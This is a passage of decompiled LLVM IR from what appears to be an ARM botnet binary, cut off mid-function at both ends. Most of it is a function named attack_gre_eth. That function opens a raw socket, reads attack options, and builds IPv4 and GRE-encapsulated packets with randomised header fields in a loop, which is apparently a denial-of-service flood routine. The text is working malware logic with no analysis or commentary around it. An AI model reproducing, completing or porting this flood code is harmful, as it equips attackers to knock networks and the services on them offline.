  store i32 %v3_a614, i32* %r1.global-to-local, align 4
  %v5_a618 = inttoptr i32 %v2_a608 to i32*
  %v6_a618 = call i32 @realloc(i32* %v5_a618, i32 %v3_a614, i32 ptrtoint (i32* @global_var_81d0.89 to i32), i32 9)
  %v2_a61c = load i8, i8* bitcast (i8** @global_var_235e8.65 to i8*), align 4
  %v3_a61c = zext i8 %v2_a61c to i32
  store i32 %v3_a61c, i32* %r3.global-to-local, align 4
  %v1_a620 = load i32, i32* @r6, align 4
  %v2_a620 = inttoptr i32 %v1_a620 to i32*
  store i32 %v6_a618, i32* %v2_a620, align 4
  %v0_a624 = load i32, i32* @r4, align 4
  %v2_a624 = load i32, i32* %r3.global-to-local, align 4
  %v5_a624 = mul i32 %v2_a624, 4
  %v6_a624 = add i32 %v5_a624, %v6_a618
  %v7_a624 = inttoptr i32 %v6_a624 to i32*
  store i32 %v0_a624, i32* %v7_a624, align 4
  %v0_a628 = load i32, i32* %r3.global-to-local, align 4
  %v1_a628 = load i32, i32* @r8, align 4
  %v2_a628 = add i32 %v1_a628, %v0_a628
  store i32 %v2_a628, i32* %r2.global-to-local, align 4
  %v1_a630 = trunc i32 %v2_a628 to i8
  %v2_a630 = load i32, i32* @r5, align 4
  %v3_a630 = inttoptr i32 %v2_a630 to i8*
  store i8 %v1_a630, i8* %v3_a630, align 1
  %v2_a634 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_a634, i32* @r4, align 4
  store i32 %v6_a330, i32* @r5, align 4
  store i32 %v9_a330, i32* @r6, align 4
  store i32 %v12_a330, i32* @r7, align 4
  store i32 %v15_a330, i32* @r8, align 4
  ret i32 %v1_a628

; uselistorder directives
  uselistorder i32 %v1_a628, { 1, 0 }
  uselistorder i32 %v3_a614, { 1, 0 }
  uselistorder i32 %v1_a5e0, { 1, 0 }
  uselistorder i32 %v3_a5c8, { 1, 0 }
  uselistorder i32 %v1_a594, { 1, 0 }
  uselistorder i32 %v3_a57c, { 1, 0 }
  uselistorder i32 %v1_a548, { 1, 0 }
  uselistorder i32 %v3_a530, { 1, 0 }
  uselistorder i32 %v1_a4fc, { 1, 0 }
  uselistorder i32 %v3_a4e4, { 1, 0 }
  uselistorder i32 %v1_a4b0, { 1, 0 }
  uselistorder i32 %v3_a498, { 1, 0 }
  uselistorder i32 %v1_a464, { 1, 0 }
  uselistorder i32 %v3_a44c, { 1, 0 }
  uselistorder i32 %v1_a418, { 1, 0 }
  uselistorder i32 %v6_a404, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a400, { 1, 0 }
  uselistorder i32 %v1_a3cc, { 1, 0 }
  uselistorder i32 %v3_a3b4, { 1, 0 }
  uselistorder i32 %v2_a390, { 1, 0 }
  uselistorder i32 %v6_a36c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a368, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 33, 34, 35, 36, 37, 38, 39, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 32, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r2.global-to-local, { 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 21, 17, 18, 19, 20, 0 }
  uselistorder i32* %r1.global-to-local, { 35, 36, 37, 38, 39, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i8 7, { 2, 3, 4, 0, 1 }
  uselistorder i8 4, { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_235e8.65 to i8*), { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_235e9.71 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_235e8.65, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_235e8.65 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a66c = load i32, i32* @r4, align 4
  %v24_a66c = load i32, i32* @fp, align 4
  %v27_a66c = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_a698 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_a69c = load i32, i32* @r4, align 4
  store i32 %v0_a69c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a6a8 = load i32, i32* @sb, align 4
  store i32 %v0_a6a8, i32* %r3.global-to-local, align 4
  %v0_a6ac = load i32, i32* @r5, align 4
  store i32 %v0_a6ac, i32* %r0.global-to-local, align 4
  %v5_a6b0 = inttoptr i32 %v0_a69c to i32*
  %v6_a6b0 = call i32 @attack_get_opt_int(i32 %v0_a6ac, i32* %v5_a6b0, i32 2, i32 %v0_a6a8)
  %v1_a6bc = urem i32 %v6_a6b0, 256
  store i32 %v1_a6bc, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a6c8 = load i32, i32* @r4, align 4
  store i32 %v0_a6c8, i32* %r1.global-to-local, align 4
  %v0_a6cc = load i32, i32* @r5, align 4
  store i32 %v0_a6cc, i32* %r0.global-to-local, align 4
  %v5_a6d0 = trunc i32 %v6_a6b0 to i8
  %v6_a6d4 = inttoptr i32 %v0_a6c8 to i32*
  %v7_a6d4 = call i32 @attack_get_opt_int(i32 %v0_a6cc, i32* %v6_a6d4, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_a6d8 = load i32, i32* @r4, align 4
  store i32 %v0_a6d8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a6d4, i32* %fp.global-to-local, align 4
  %v0_a6e8 = load i32, i32* @r5, align 4
  store i32 %v0_a6e8, i32* %r0.global-to-local, align 4
  %v4_a6ec = inttoptr i32 %v0_a6d8 to i32*
  %v5_a6ec = call i32 @attack_get_opt_int(i32 %v0_a6e8, i32* %v4_a6ec, i32 4, i32 64)
  %v1_a6f4 = urem i32 %v5_a6ec, 256
  store i32 %v1_a6f4, i32* %ip.global-to-local, align 4
  %v0_a6f8 = load i32, i32* @r4, align 4
  store i32 %v0_a6f8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a704 = load i32, i32* @r5, align 4
  store i32 %v0_a704, i32* %r0.global-to-local, align 4
  %v6_a70c = inttoptr i32 %v0_a6f8 to i32*
  %v7_a70c = call i32 @attack_get_opt_int(i32 %v0_a704, i32* %v6_a70c, i32 5, i32 1)
  %v1_a718 = urem i32 %v7_a70c, 256
  store i32 %v1_a718, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a724 = load i32, i32* @r4, align 4
  store i32 %v0_a724, i32* %r1.global-to-local, align 4
  %v0_a728 = load i32, i32* @r5, align 4
  store i32 %v0_a728, i32* %r0.global-to-local, align 4
  %v5_a730 = inttoptr i32 %v0_a724 to i32*
  %v6_a730 = call i32 @attack_get_opt_int(i32 %v0_a728, i32* %v5_a730, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_a73c = load i32, i32* @r4, align 4
  store i32 %v0_a73c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a748 = load i32, i32* @r5, align 4
  store i32 %v0_a748, i32* %r0.global-to-local, align 4
  %v5_a74c = inttoptr i32 %v0_a73c to i32*
  %v6_a74c = call i32 @attack_get_opt_int(i32 %v0_a748, i32* %v5_a74c, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_a750 = load i32, i32* @r4, align 4
  store i32 %v0_a750, i32* %r1.global-to-local, align 4
  %v0_a754 = load i32, i32* @sb, align 4
  store i32 %v0_a754, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_a74c, i32* @r8, align 4
  %v0_a760 = load i32, i32* @r5, align 4
  store i32 %v0_a760, i32* %r0.global-to-local, align 4
  %v4_a764 = inttoptr i32 %v0_a750 to i32*
  %v5_a764 = call i32 @attack_get_opt_int(i32 %v0_a760, i32* %v4_a764, i32 %v0_a754, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a774 = load i32, i32* @r4, align 4
  store i32 %v0_a774, i32* %r1.global-to-local, align 4
  %v0_a778 = load i32, i32* @r5, align 4
  store i32 %v0_a778, i32* %r0.global-to-local, align 4
  %v4_a77c = inttoptr i32 %v0_a774 to i32*
  %v5_a77c = call i32 @attack_get_opt_int(i32 %v0_a778, i32* %v4_a77c, i32 1, i32 1)
  %v1_a784 = urem i32 %v5_a77c, 256
  store i32 %v1_a784, i32* %ip.global-to-local, align 4
  %v0_a788 = load i32, i32* @r4, align 4
  store i32 %v0_a788, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a790 = load i32, i32* @sb, align 4
  store i32 %v0_a790, i32* %r3.global-to-local, align 4
  %v0_a794 = load i32, i32* @r5, align 4
  store i32 %v0_a794, i32* %r0.global-to-local, align 4
  %v5_a79c = inttoptr i32 %v0_a788 to i32*
  %v6_a79c = call i32 @attack_get_opt_int(i32 %v0_a794, i32* %v5_a79c, i32 18, i32 %v0_a790)
  %v0_a7a4 = load i32, i32* @r4, align 4
  store i32 %v0_a7a4, i32* %r1.global-to-local, align 4
  %v2_a7a8 = load i32, i32* @global_var_2610c.91, align 4
  store i32 %v2_a7a8, i32* %r3.global-to-local, align 4
  store i32 %v6_a79c, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_a7b4 = load i32, i32* @r5, align 4
  store i32 %v0_a7b4, i32* %r0.global-to-local, align 4
  %v4_a7b8 = inttoptr i32 %v0_a7a4 to i32*
  %v5_a7b8 = call i32 @attack_get_opt_int(i32 %v0_a7b4, i32* %v4_a7b8, i32 24, i32 %v2_a7a8)
  %v0_a7c0 = load i32, i32* @sb, align 4
  store i32 %v0_a7c0, i32* %r0.global-to-local, align 4
  %v1_a7c4 = inttoptr i32 %v0_a7c0 to i32*
  %v2_a7c4 = call i32 @__GI_time(i32* %v1_a7c4)
  %v1_a7c8 = load i32, i32* @r6, align 4
  %v2_a7c8 = add i32 %v1_a7c8, %v2_a7c4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a7dc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a7dc, i32* %r0.global-to-local, align 4
  %v7_a7e0 = icmp eq i32 %v3_a7dc, -1
  store i1 %v7_a7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a7e0, label %dec_label_pc_ad18, label %dec_label_pc_a7ec

dec_label_pc_a7ec:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a7f4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a7f4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_a7fc = load i32, i32* @sb, align 4
  store i32 %v0_a7fc, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a808 = call i32 @__GI_setsockopt(i32 %v3_a7dc, i32 %v0_a7fc, i32 3, i32 %v6_a7f4, i32 4)
  store i32 %v5_a808, i32* %r0.global-to-local, align 4
  %v7_a80c = icmp eq i32 %v5_a808, -1
  store i1 %v7_a80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a80c, label %dec_label_pc_ad24, label %dec_label_pc_a814

dec_label_pc_a814:                                ; preds = %dec_label_pc_a7ec
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v3_a81c = mul i32 %v6_a730, 65536
  store i32 %v3_a81c, i32* %r1.global-to-local, align 4
  %v0_a820 = load i32, i32* @r8, align 4
  %v0_a824 = load i32, i32* %fp.global-to-local, align 4
  %v3_a824 = mul i32 %v0_a824, 65536
  store i32 %v3_a824, i32* %fp.global-to-local, align 4
  %v0_a828 = load i32, i32* @r7, align 4
  %v1_a828 = urem i32 %v0_a828, 256
  store i32 %v1_a828, i32* @r7, align 4
  %v3_a82c = urem i32 %v0_a824, 65536
  store i32 %v3_a82c, i32* %r3.global-to-local, align 4
  %v3_a830 = urem i32 %v6_a730, 65536
  store i32 %v3_a830, i32* %ip.global-to-local, align 4
  %v3_a834 = urem i32 %v0_a820, 65536
  %v2_a838 = icmp eq i32 %arg2, 0
  store i1 %v2_a838, i1* %cpsr_z.global-to-local, align 1
  %v0_a848 = load i32, i32* @sb, align 4
  store i32 %v0_a848, i32* %stack_var_-44, align 4
  br i1 %v2_a838, label %dec_label_pc_aa50.preheader, label %dec_label_pc_a85c

dec_label_pc_a85c:                                ; preds = %dec_label_pc_a814
  %v3_a820 = mul i32 %v0_a820, 65536
  %v3_a860 = mul i32 %v5_a764, 65536
  %v1_a864 = add i32 %v3_a860, 4325376
  %v0_a824.not = or i32 %v0_a824, -65536
  %v1_a868 = xor i32 %v0_a824.not, 65535
  %v3_a874 = mul i32 %v1_a868, 65536
  store i32 %v3_a874, i32* @r6, align 4
  %tmp68 = udiv i32 %v1_a864, 256
  %v3_a88c = and i32 %tmp68, 65280
  store i32 %v3_a88c, i32* %r3.global-to-local, align 4
  %v1_a890 = add i32 %v3_a860, 524288
  %tmp69 = mul i32 %v0_a824, 256
  %v3_a894 = and i32 %tmp69, 65280
  %v1_a898 = add i32 %v3_a860, 1835008
  %tmp70 = mul nsw i32 %v1_a868, 256
  %v3_a89c = and i32 %tmp70, 65280
  %v4_a8a0 = udiv i32 %v1_a864, 16777216
  %v5_a8a0 = or i32 %v4_a8a0, %tmp68
  %v3_a8a8 = udiv i32 %v1_a898, 256
  %v5_a8ac = trunc i32 %v5_a8a0 to i16
  %tmp71 = udiv i32 %v0_a824, 256
  %v4_a8b0 = urem i32 %tmp71, 256
  %v5_a8b0 = or i32 %v4_a8b0, %v3_a894
  store i32 %v5_a8b0, i32* @r7, align 4
  %tmp72 = udiv i32 %v1_a868, 256
  %v4_a8b4 = urem i32 %tmp72, 256
  %v5_a8b4 = or i32 %v4_a8b4, %v3_a89c
  store i32 %v5_a8b4, i32* @fp, align 4
  store i32 %v3_a820, i32* %r2.global-to-local, align 4
  store i32 %v3_a81c, i32* %r1.global-to-local, align 4
  %v1_a8c0 = and i32 %v3_a8a8, 65280
  %tmp73 = mul i32 %v6_a730, 256
  %v3_a8c4 = and i32 %tmp73, 65280
  %tmp74 = mul i32 %v0_a820, 256
  %v3_a8c8 = and i32 %tmp74, 65280
  %v4_a8d0 = udiv i32 %v1_a898, 16777216
  %v5_a8d0 = or i32 %v1_a8c0, %v4_a8d0
  store i32 %v5_a8d0, i32* @r5, align 4
  %tmp75 = udiv i32 %v6_a730, 256
  %v4_a8d4 = urem i32 %tmp75, 256
  %v5_a8d4 = or i32 %v4_a8d4, %v3_a8c4
  store i32 %v5_a8d4, i32* %r0.global-to-local, align 4
  %tmp76 = udiv i32 %v0_a820, 256
  %v4_a8d8 = urem i32 %tmp76, 256
  %v5_a8d8 = or i32 %v4_a8d8, %v3_a8c8
  store i32 %v5_a8d8, i32* %ip.global-to-local, align 4
  %tmp77 = udiv i32 %v1_a890, 256
  %v3_a8dc = and i32 %tmp77, 65280
  store i32 %v3_a8dc, i32* @lr, align 4
  %v5_a8e8 = trunc i32 %v5_a8d0 to i16
  %v4_a8ec = udiv i32 %v1_a890, 16777216
  %v5_a8ec = or i32 %v3_a8dc, %v4_a8ec
  store i32 %v5_a8ec, i32* @r8, align 4
  store i32 %v0_a848, i32* @r4, align 4
  %v4_a948 = sext i8 %v5_a6d0 to i32
  %v1_a954 = trunc i32 %v5_a6ec to i8
  %v2_aa08 = icmp eq i32 %v1_a828, 0
  %sext = mul nuw i32 %v5_a8d4, 65536
  %v4_aa2c = sdiv i32 %sext, 65536
  %sext7 = mul nuw i32 %v5_a8d8, 65536
  %v4_aa34 = sdiv i32 %sext7, 65536
  br label %dec_label_pc_a8f4

dec_label_pc_a8f4:                                ; preds = %bb80, %dec_label_pc_a85c
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_a900 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_a900, i32* %r0.global-to-local, align 4
  %v3_a908 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a908, i32* %r2.global-to-local, align 4
  %v2_a90c = load i32, i32* @r4, align 4
  %v5_a90c = mul i32 %v2_a90c, 4
  %v6_a90c = add i32 %v5_a90c, %v2_a698
  %v7_a90c = inttoptr i32 %v6_a90c to i32*
  store i32 %v2_a900, i32* %v7_a90c, align 4
  store i32 %v2_a698, i32* %r1.global-to-local, align 4
  %v0_a914 = load i32, i32* %r2.global-to-local, align 4
  %v3_a914 = mul i32 %v0_a914, 32
  store i32 %v3_a914, i32* %r3.global-to-local, align 4
  %v4_a918 = mul i32 %v0_a914, 4
  %v5_a918 = add i32 %v4_a918, %v2_a698
  %v6_a918 = inttoptr i32 %v5_a918 to i32*
  %v7_a918 = load i32, i32* %v6_a918, align 4
  store i32 %v7_a918, i32* %r4.global-to-local, align 4
  %v5_a91c = mul i32 %v0_a914, 24
  store i32 %v5_a91c, i32* %r3.global-to-local, align 4
  %v1_a920 = load i32, i32* @sl, align 4
  %v2_a920 = add i32 %v1_a920, %v5_a91c
  store i32 %v2_a920, i32* %lr.global-to-local, align 4
  %v1_a924 = inttoptr i32 %v7_a918 to i8*
  %v2_a924 = load i8, i8* %v1_a924, align 1
  %tmp = urem i8 %v2_a924, 16
  %v1_a928 = zext i8 %tmp to i32
  %v1_a92c = or i32 %v1_a928, 64
  store i32 %v1_a92c, i32* %r3.global-to-local, align 4
  %v1_a930 = trunc i32 %v1_a92c to i8
  store i8 %v1_a930, i8* %v1_a924, align 1
  %v0_a934 = load i32, i32* %r4.global-to-local, align 4
  %v1_a934 = inttoptr i32 %v0_a934 to i8*
  %v2_a934 = load i8, i8* %v1_a934, align 1
  %v1_a938 = and i8 %v2_a934, -16
  %v1_a93c = or i8 %v1_a938, 5
  store i32 %v1_a718, i32* %r3.global-to-local, align 4
  store i8 %v1_a93c, i8* %v1_a934, align 1
  store i32 %v4_a948, i32* %r1.global-to-local, align 4
  %v2_a94c = load i32, i32* %r4.global-to-local, align 4
  %v3_a94c = add i32 %v2_a94c, 1
  %v4_a94c = inttoptr i32 %v3_a94c to i8*
  store i8 %v5_a6d0, i8* %v4_a94c, align 1
  store i32 %v1_a6f4, i32* %r2.global-to-local, align 4
  %v2_a954 = load i32, i32* %r4.global-to-local, align 4
  %v3_a954 = add i32 %v2_a954, 8
  %v4_a954 = inttoptr i32 %v3_a954 to i8*
  store i8 %v1_a954, i8* %v4_a954, align 1
  %v0_a958 = load i32, i32* %r3.global-to-local, align 4
  %v2_a958 = icmp eq i32 %v0_a958, 0
  store i1 %v2_a958, i1* %cpsr_z.global-to-local, align 1
  %v2_a960 = load i32, i32* %r4.global-to-local, align 4
  %v3_a960 = add i32 %v2_a960, 2
  %v4_a960 = inttoptr i32 %v3_a960 to i16*
  store i16 %v5_a8ac, i16* %v4_a960, align 2
  %v2_a968 = load i32, i32* %r4.global-to-local, align 4
  %v3_a968 = add i32 %v2_a968, 9
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 47, i8* %v4_a968, align 1
  store i32 %v5_a7b8, i32* %r3.global-to-local, align 4
  %v1_a970 = load i32, i32* %r4.global-to-local, align 4
  %v2_a970 = add i32 %v1_a970, 12
  %v3_a970 = inttoptr i32 %v2_a970 to i32*
  store i32 %v5_a7b8, i32* %v3_a970, align 4
  %v0_a974 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a974, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a8f4
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a978 = load i32, i32* %r4.global-to-local, align 4
  %v4_a978 = add i32 %v3_a978, 6
  %v5_a978 = inttoptr i32 %v4_a978 to i16*
  store i16 64, i16* %v5_a978, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a8f4, %bb
  %v0_a97c = load i32, i32* %lr.global-to-local, align 4
  %v1_a97c = add i32 %v0_a97c, 16
  %v2_a97c = inttoptr i32 %v1_a97c to i32*
  %v3_a97c = load i32, i32* %v2_a97c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_a984 = load i32, i32* %r4.global-to-local, align 4
  %v2_a984 = add i32 %v1_a984, 16
  %v3_a984 = inttoptr i32 %v2_a984 to i32*
  store i32 %v3_a97c, i32* %v3_a984, align 4
  %v0_a988 = load i32, i32* %r4.global-to-local, align 4
  %v1_a988 = add i32 %v0_a988, 24
  store i32 %v1_a988, i32* %r0.global-to-local, align 4
  %v1_a98c = add i32 %v0_a988, 20
  store i32 %v1_a98c, i32* %r1.global-to-local, align 4
  %v0_a990 = load i32, i32* %ip.global-to-local, align 4
  %v1_a990 = add i32 %v0_a990, 101
  store i32 %v1_a990, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_a99c = load i32, i32* @r7, align 4
  %v1_a99c = trunc i32 %v0_a99c to i16
  %v3_a99c = add i32 %v0_a988, 4
  %v4_a99c = inttoptr i32 %v3_a99c to i16*
  store i16 %v1_a99c, i16* %v4_a99c, align 2
  %v0_a9a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_a9a0 = trunc i32 %v0_a9a0 to i16
  %v2_a9a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a9a0 = add i32 %v2_a9a0, 2
  %v4_a9a0 = inttoptr i32 %v3_a9a0 to i16*
  store i16 %v1_a9a0, i16* %v4_a9a0, align 2
  %v0_a9a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a9a4 = trunc i32 %v0_a9a4 to i8
  %v2_a9a4 = load i32, i32* %r0.global-to-local, align 4
  %v3_a9a4 = add i32 %v2_a9a4, 13
  %v4_a9a4 = inttoptr i32 %v3_a9a4 to i8*
  store i8 %v1_a9a4, i8* %v4_a9a4, align 1
  %v0_a9a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a9a8 = trunc i32 %v0_a9a8 to i8
  %v2_a9a8 = load i32, i32* %r0.global-to-local, align 4
  %v3_a9a8 = add i32 %v2_a9a8, 12
  %v4_a9a8 = inttoptr i32 %v3_a9a8 to i8*
  store i8 %v1_a9a8, i8* %v4_a9a8, align 1
  %v0_a9ac = load i32, i32* %r4.global-to-local, align 4
  %v1_a9ac = add i32 %v0_a9ac, 38
  %v2_a9ac = inttoptr i32 %v1_a9ac to i8*
  %v3_a9ac = load i8, i8* %v2_a9ac, align 1
  %tmp86 = urem i8 %v3_a9ac, 16
  %v1_a9b0 = zext i8 %tmp86 to i32
  %v1_a9b4 = or i32 %v1_a9b0, 64
  store i32 %v1_a9b4, i32* %r3.global-to-local, align 4
  %v1_a9b8 = trunc i32 %v1_a9b4 to i8
  store i8 %v1_a9b8, i8* %v2_a9ac, align 1
  %v0_a9bc = load i32, i32* %r4.global-to-local, align 4
  %v1_a9bc = add i32 %v0_a9bc, 38
  %v2_a9bc = inttoptr i32 %v1_a9bc to i8*
  %v3_a9bc = load i8, i8* %v2_a9bc, align 1
  %v4_a9bc = zext i8 %v3_a9bc to i32
  %v1_a9c0 = and i32 %v4_a9bc, 240
  %v1_a9c4 = or i32 %v1_a9c0, 5
  store i32 %v1_a9c4, i32* %r2.global-to-local, align 4
  %v1_a9c8 = trunc i32 %v1_a9c4 to i8
  store i8 %v1_a9c8, i8* %v2_a9bc, align 1
  store i32 %v4_a948, i32* %ip.global-to-local, align 4
  %v0_a9d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_a9d0 = add i32 %v0_a9d0, 38
  store i32 %v1_a9d0, i32* @r5, align 4
  %v3_a9d4 = add i32 %v0_a9d0, 39
  %v4_a9d4 = inttoptr i32 %v3_a9d4 to i8*
  store i8 %v5_a6d0, i8* %v4_a9d4, align 1
  store i32 %v5_a8d0, i32* %lr.global-to-local, align 4
  %v2_a9dc = load i32, i32* @r5, align 4
  %v3_a9dc = add i32 %v2_a9dc, 2
  %v4_a9dc = inttoptr i32 %v3_a9dc to i16*
  store i16 %v5_a8e8, i16* %v4_a9dc, align 2
  store i32 %v1_a6f4, i32* %r1.global-to-local, align 4
  %v0_a9e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a9e4, label %.thread8, label %bb78

.thread8:                                         ; preds = %.thread
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb79

bb78:                                             ; preds = %.thread
  store i32 64, i32* %r2.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v3_a9ec = load i32, i32* @r5, align 4
  %v4_a9ec = add i32 %v3_a9ec, 6
  %v5_a9ec = inttoptr i32 %v4_a9ec to i16*
  store i16 64, i16* %v5_a9ec, align 2
  %v0_a9f0.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t85 = trunc i32 %v0_a9f0.pre to i8
  br label %bb79

bb79:                                             ; preds = %.thread8, %bb78
  %v5_a6ec.sink.off0 = phi i8 [ %v1_a954, %.thread8 ], [ %extract.t85, %bb78 ]
  %v2_a9f0 = load i32, i32* @r5, align 4
  %v3_a9f0 = add i32 %v2_a9f0, 8
  %v4_a9f0 = inttoptr i32 %v3_a9f0 to i8*
  store i8 %v5_a6ec.sink.off0, i8* %v4_a9f0, align 1
  %v0_a9f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a9f4 = trunc i32 %v0_a9f4 to i8
  %v2_a9f4 = load i32, i32* @r5, align 4
  %v3_a9f4 = add i32 %v2_a9f4, 9
  %v4_a9f4 = inttoptr i32 %v3_a9f4 to i8*
  store i8 %v1_a9f4, i8* %v4_a9f4, align 1
  %v0_a9f8 = load i32, i32* @fp, align 4
  %v1_a9f8 = trunc i32 %v0_a9f8 to i16
  %v2_a9f8 = load i32, i32* @r5, align 4
  %v3_a9f8 = add i32 %v2_a9f8, 4
  %v4_a9f8 = inttoptr i32 %v3_a9f8 to i16*
  store i16 %v1_a9f8, i16* %v4_a9f8, align 2
  %v0_a9fc = call i32 @rand_next()
  store i32 %v0_a9fc, i32* %r0.global-to-local, align 4
  store i32 %v1_a828, i32* %ip.global-to-local, align 4
  store i1 %v2_aa08, i1* %cpsr_z.global-to-local, align 1
  %v1_aa0c = sub i32 1023, %v0_a9fc
  store i32 %v1_aa0c, i32* %r3.global-to-local, align 4
  br i1 %v2_aa08, label %.thread9, label %.thread10

.thread9:                                         ; preds = %bb79
  %v2_aa14 = load i32, i32* @r5, align 4
  %v3_aa14 = add i32 %v2_aa14, 16
  %v4_aa14 = inttoptr i32 %v3_aa14 to i32*
  store i32 %v1_aa0c, i32* %v4_aa14, align 4
  br label %bb80

.thread10:                                        ; preds = %bb79
  %v1_aa10 = load i32, i32* %r4.global-to-local, align 4
  %v2_aa10 = add i32 %v1_aa10, 16
  %v3_aa10 = inttoptr i32 %v2_aa10 to i32*
  %v4_aa10 = load i32, i32* %v3_aa10, align 4
  store i32 %v4_aa10, i32* %r3.global-to-local, align 4
  %v2_aa18 = load i32, i32* @r5, align 4
  %v3_aa18 = add i32 %v2_aa18, 16
  %v4_aa18 = inttoptr i32 %v3_aa18 to i32*
  store i32 %v4_aa10, i32* %v4_aa18, align 4
  br label %bb80

bb80:                                             ; preds = %.thread9, %.thread10
  %v1_aa1c = load i32, i32* @r5, align 4
  %v2_aa1c = add i32 %v1_aa1c, 12
  %v3_aa1c = inttoptr i32 %v2_aa1c to i32*
  store i32 %v0_a9fc, i32* %v3_aa1c, align 4
  %v3_aa20 = load i32, i32* %stack_var_-44, align 4
